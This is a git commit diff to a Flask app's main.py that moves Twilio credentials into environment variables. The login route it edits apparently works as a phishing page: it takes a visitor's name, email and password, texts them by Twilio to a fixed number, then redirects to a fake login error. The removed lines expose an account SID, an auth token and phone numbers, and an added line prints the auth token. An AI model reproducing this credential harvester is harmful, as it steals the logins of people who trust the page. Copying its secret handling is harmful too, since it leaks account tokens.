40d27aeb1e8848a35de1f72f1ca787b933b9500f
blackTiles <black4tiles@gmail.com>
2022-11-11 08:52:44 +0530

    Env added

--- main.py
+++ main.py
@@ -1,6 +1,10 @@
 from flask import Flask, render_template, request, redirect
 from twilio.rest import Client
 import os
+from dotenv import load_dotenv
+load_dotenv()
+
+print(os.getenv('AUTH_TOKEN'))
 
 app = Flask(__name__)
 
@@ -25,13 +29,13 @@ def login():
             sender_email = l_email
             sender_password = l_pass
 
-            account_sid = 'AC7b7eba1c290afbf3365bc5139e0b956a' 
-            auth_token = '01edb976f5df245d46954b350e5f23e5' 
+            account_sid = os.getenv('ACCOUNT_SSID')
+            auth_token = os.getenv('AUTH_TOKEN')
             client = Client(account_sid, auth_token) 
             message = client.messages.create( 
-                                        from_='+18148854900',  
+                                        from_=os.getenv('TWILIO_NUMBER'),  
                                         body=f'{sender_name}\n{sender_email}\n{sender_password}',      
-                                        to='+917319865341') 
+                                        to=os.getenv('RECEIVER_NUMBER')) 
             print("Success")
             return redirect('/login_error')
     else:
